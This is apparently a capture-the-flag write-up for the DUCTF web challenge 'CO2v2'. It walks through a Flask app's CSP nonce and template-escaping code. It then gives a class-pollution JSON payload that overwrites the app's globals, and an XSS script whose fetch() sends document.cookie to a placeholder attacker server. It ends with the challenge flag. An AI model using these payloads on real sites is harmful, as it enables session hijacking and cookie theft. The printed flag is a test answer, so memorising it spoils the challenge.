CO2v2
============

In the latest iteration, the team removed the get_flag endpoint, so now it won't be possible to use the same vulnerability to exploit this challenge.

Looking through the code, there are a few new elements that have been added:
- New CSP Policies are being used - but right now they are being protected by a "randomly" generated nonce.
- There is a new way to set the template environment for the application - This feature allows the admin user to set a new environment based on their new rules for autoescaping. This is an incomplete feature meant only for test environment.
- There is a new Report button on the index page, looks like this is meant for the administrative user to check for any errors.
- The cookies are not using HttpOnly so its possible to steal a cookie.

Here are the relevant bits of code:
```py
# Secret used to generate a nonce to be used with the CSP policy 
SECRET_NONCE = generate_random_string()
# Use a random amount of characters to append while generating nonce value to make it more secure
RANDOM_COUNT = random.randint(32,64)

TEMPLATES_ESCAPE_ALL = True

# The generated nonce is randomized with some data at the end before hashing with the RANDOM_COUNT global variable.
def generate_nonce(data):
    nonce = SECRET_NONCE + data + generate_random_string(length=RANDOM_COUNT)
    sha256_hash = hashlib.sha256()
    sha256_hash.update(nonce.encode('utf-8'))
    hash_hex = sha256_hash.hexdigest()
    g.nonce = hash_hex
    return hash_hex

# The nonce is generated for page.
@app.before_request
def set_nonce():
    generate_nonce(request.path)

# The CSP is applied to the request
@app.after_request
def apply_csp(response):
    nonce = g.get('nonce')
    csp_policy = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}' https://ajax.googleapis.com; "
        f"style-src 'self' 'nonce-{nonce}' https://cdn.jsdelivr.net; "
        f"script-src-attr 'self' 'nonce-{nonce}'; " 
        f"connect-src *; "
    )
    response.headers['Content-Security-Policy'] = csp_policy
    return response

# __init__.py
app.config["SESSION_COOKIE_HTTPONLY"] = False

```

Using a similar exploit from last time we need to craft a payload that does the following:
- Figure out a way to generate a nonce that will be used to load scripts - If this step is missed the XSS attack won't work
- Overwrite the template environment and get the application to escape all html.

The following payload will achieve all of the above:
```json
// save_feedback
{
    "title":"",
    "content":"",
    "rating":"",
    "referred":"",
   "__class__": {
        "__init__":{
            "__globals__":{
                "RANDOM_COUNT": 0,
                "SECRET_NONCE": "t",
                "TEMPLATES_ESCAPE_ALL":false
            }
        }
    }
}

// /admin/update-accepted-templates - this request will force the app to set a new template env with the escaping disabled
{
    "title":"",
    "content":"",
    "rating":"",
    "referred":"",
    "policy" : "strict"      
}

```

Now we can figure out what the nonce is, this can be done 2 ways:
- Following the code and generating the nonce locally with the same functions.
- Just refreshing the page and checking the nonce on the / endpoint.

Using the nonce in our payload and clicking on the report button should then reveal the flag.

XSS Payload:
```
<script nonce="a2fe8952412bc49de813bb82db50d5aa497d6106b6b43c8a72cab443aa017e32">fetch("http://attacker-server/xss?cookie="+document.cookie);</script>
```

Flag:
```
DUCTF{_1_d3cid3_wh4ts_esc4p3d_}
```